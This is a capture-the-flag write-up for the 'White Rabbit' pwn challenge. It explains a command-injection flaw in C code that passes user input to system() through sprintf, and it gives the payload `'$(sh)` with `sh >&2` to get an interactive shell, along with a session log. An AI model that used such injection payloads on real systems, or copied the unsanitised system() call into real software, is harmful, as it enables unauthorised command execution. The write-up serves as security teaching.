# White Rabbit

This short pwn challenge reads input once, checks the input for 'flag,' then prints the file in the input.

The code used to print the file is along the lines of:
```c
sprintf(line, "[ -f '%1$s' ] && cat '%1$s' || echo File does not exist", buffer);
system(line);
```

This can be found via ghidra or even `strings` which will reveal the snprintf format string.

This challenge is vulnerable to command injection.

There are multiple approaches to inject a command. One option is to close the single quote with another single quote, then execute `bash` or `sh` via command substitution. The payload is then `'$(sh)`.

This doesn't work 100% however, since system is trying to user our input in a command. So we will need to pipe our output to stderr insted of stdout with something like `sh >&2`.

```
Follow the white rabbit.
Path to follow: '$(sh)
sh >&2
$ whoami
whiterabbit
$ exit
sh: 1: [: missing ]
File does not exist
```

We can now run `cat flag.txt` without restriction!

Again, there are many different ways to do this, as long as you inject some command.
